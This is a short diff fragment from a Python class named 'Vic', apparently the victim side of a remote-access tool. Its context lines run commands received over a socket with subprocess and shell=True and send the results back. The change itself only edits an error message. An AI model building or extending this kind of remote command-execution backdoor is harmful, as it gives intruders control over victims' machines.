@@ -45,7 +45,7 @@ class Vic():
                     data = f"[+]Executed On {prog.pid}"
                     self.s.send(data.encode())
                 except:
-                    self.s.send(b"[-]Error.")
+                    self.s.send(b"[-]Error.COMMOND")
 
             else:
                     execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
